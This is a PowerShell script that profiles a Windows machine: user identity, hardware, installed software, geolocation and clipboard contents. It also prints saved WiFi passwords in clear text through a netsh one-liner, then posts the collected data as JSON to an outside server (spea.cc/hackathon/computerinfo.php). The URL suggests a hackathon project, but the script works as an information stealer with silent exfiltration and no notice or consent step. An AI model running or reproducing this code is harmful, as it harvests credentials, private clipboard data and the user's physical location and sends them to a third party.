# Get UUID
$uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID

# Current User
$cu = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$info = Get-ComputerInfo
$email = $info.CsPrimaryOwnerName
$ver = $info.OsName
$model = $info.CsManufacturer + " " + $info.CsModel

# GPU
$gpu = Get-WmiObject win32_VideoController | Select VideoProcessor,VideoModeDescription,MaxRefreshRate

# Location
Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
$GeoWatcher.Start() #Begin resolving current locaton

while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
    Start-Sleep -Milliseconds 100 #Wait for discovery.
}  

if ($GeoWatcher.Permission -eq 'Denied'){
    Write-Error 'Access Denied for Location Information'
} else {
    $latlon = $GeoWatcher.Position.Location | Select Latitude,Longitude
}

# Installed Programs
$InstalledSoftware = Get-ChildItem "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall"
foreach($obj in $InstalledSoftware){write-host $obj.GetValue('DisplayName')}

# Systeminfo
$sysinfo = systeminfo
$ram = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb
$cpu = (Get-WmiObject Win32_Processor | Select Name).Name
$tz = (Get-TimeZone).DisplayName

# Get WiFi passwords (http://woshub.com/view-saved-wi-fi-passwords-windows/)
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table –Wrap

# Send the data!
$data = [PSCustomObject]@{
    UUID = $uuid
    Time = Get-Date -UFormat %s
    CurrentUser = $cu
    Email = $email
    OS = $ver
    Model = $model

    Clipboard = Get-Clipboard
    RAM = $ram
    CPU = $cpu
    GPU = $gpu.VideoProcessor
    TimeZone = $tz
    Location = $latlon.Latitude.ToString() + ", " + $latlon.Longitude
}

$json = $data | ConvertTo-Json -Compress
$json

$url = "https://spea.cc/hackathon/computerinfo.php"
$web = Invoke-WebRequest -Uri $url -Method Post -Body $json -ContentType 'application/json; charset=UTF-8' -UseBasicParsing
$web